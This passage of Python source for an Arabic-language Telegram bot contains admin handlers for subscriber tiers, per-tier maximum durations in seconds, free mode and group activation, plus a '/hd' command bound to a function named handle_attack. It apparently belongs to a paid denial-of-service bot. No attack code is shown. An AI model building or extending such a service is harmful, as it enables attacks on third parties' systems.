        sub_type_add = context.user_data.get("awaiting_sub_add")
        if ":" in text:
            try:
                target_id_str, duration_str = text.split(":", 1)
                target_id = int(target_id_str.strip())
                duration_str = duration_str.strip().lower()

                if duration_str.endswith("d"):
                    expires_at = datetime.now() + timedelta(days=int(duration_str.replace("d", "")))
                elif duration_str.endswith("h"):
                    expires_at = datetime.now() + timedelta(hours=int(duration_str.replace("h", "")))
                else:
                    await update.message.reply_text("⚠️ حدد المدة بـ d للأيام أو h للساعات (مثال: `3d` أو `12h`).")
                    return

                try:
                    chat_info = await context.bot.get_chat(target_id)
                    u_name = chat_info.first_name or "بدون اسم"
                    u_username = f"@{chat_info.username}" if chat_info.username else "لا يوجد"
                except Exception:
                    u_name, u_username = "غير معروف", "غير معروف"

                SUBSCRIBERS_DB[target_id] = {
                    "name": u_name,
                    "username": u_username,
                    "type": sub_type_add,
                    "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M"),
                    "expires_at": expires_at
                }
                context.user_data["awaiting_sub_add"] = None
                await update.message.reply_text(
                    f"✅ **تم إضافة المشترك بنجاح!**\n\n"
                    f"👤 **الاسم:** {clean_markdown(u_name)}\n"
                    f"🆔 **الأيدي:** `{target_id}`\n"
                    f"🏷 **النوع:** {sub_type_add}\n"
                    f"⏳ **ينتهي في:** `{expires_at.strftime('%Y-%m-%d %H:%M')}`",
                    parse_mode="Markdown"
                )
            except ValueError:
                await update.message.reply_text("⚠️ خطأ في الصيغة! الأيدي رقم والمدة صحيحة.")
        else:
            await update.message.reply_text("⚠ صيغة خاطئة: `ID:المدة` (مثال: `123456789:3d`)")

    elif context.user_data.get("awaiting_max_regular"):
        try:
            MAX_TIME_REGULAR = int(text)
            context.user_data["awaiting_max_regular"] = False
            await update.message.reply_text(f"✅ تم تحديد أقصى وقت للمشترك العادي بـ `{MAX_TIME_REGULAR}` ثانية.", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("⚠️ أدخل أرقام فقط.")

    elif context.user_data.get("awaiting_max_vip"):
        try:
            MAX_TIME_VIP = int(text)
            context.user_data["awaiting_max_vip"] = False
            await update.message.reply_text(f"✅ تم تحديد أقصى وقت لمشترك VIP بـ `{MAX_TIME_VIP}` ثانية.", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("⚠ أدخل أرقام فقط.")

    elif context.user_data.get("awaiting_free_mode_time"):
        try:
            FREE_MODE_MAX_TIME = int(text)
            FREE_MODE_ENABLED = True
            context.user_data["awaiting_free_mode_time"] = False
            await update.message.reply_text(f"✅ **تم تفعيل الوضع المجاني!** أقصى وقت مسموح: `{FREE_MODE_MAX_TIME}`s", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("⚠️ أدخل أرقام فقط.")

    elif context.user_data.get("awaiting_group_max_time"):
        try:
            max_t = int(text)
            g_id = context.user_data["awaiting_group_max_time"]
            g_title = context.user_data.get("group_title", "المجموعة")
            ACTIVATED_GROUPS[g_id] = {"title": g_title, "max_time": max_t}
            context.user_data["awaiting_group_max_time"] = None
            await update.message.reply_text(f"✅ **تم تفعيل المجموعة:** {clean_markdown(g_title)} (الوقت: `{max_t}`s)", parse_mode="Markdown")
        except ValueError:
            await update.message.reply_text("⚠️ أدخل أرقام فقط.")

# ----------------- معالج الملفات والمتحركات -----------------
async def receive_animation_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_developer(update.effective_user.id):
        return

    global CURRENT_ANIMATION_ID
    if context.user_data.get("awaiting_animation"):
        if update.message.animation:
            CURRENT_ANIMATION_ID = update.message.animation.file_id
        elif update.message.video:
            CURRENT_ANIMATION_ID = update.message.video.file_id
        elif update.message.document and update.message.document.mime_type == "video/mp4":
            CURRENT_ANIMATION_ID = update.message.document.file_id
        else:
            await update.message.reply_text("⚠️ يرجى إرسال ملف متحركة (GIF) أو فيديو قصير فقط!")
            return

        context.user_data["awaiting_animation"] = False
        await update.message.reply_text("✅ تم تعيين المتحركة بنجاح!")

# ----------------- التشغيل الرئيسي -----------------
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("open", open_group_command))
    app.add_handler(CommandHandler("hd", handle_attack))
    
    # معالج استقبال أحداث طلبات الانضمام لتبديل الحالة فوراً
    app.add_handler(ChatJoinRequestHandler(track_join_requests))

    app.add_handler(CallbackQueryHandler(button_click_handler))
    app.add_handler(MessageHandler(filters.ANIMATION | filters.VIDEO, receive_animation_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_input_handler))

    print("🤖 البوت يعمل بنجاح مع دعم كامل لطلبات الانضمام والروابط الخاصة ⚡...")
    app.run_polling()

if __name__ == "__main__":
    main()

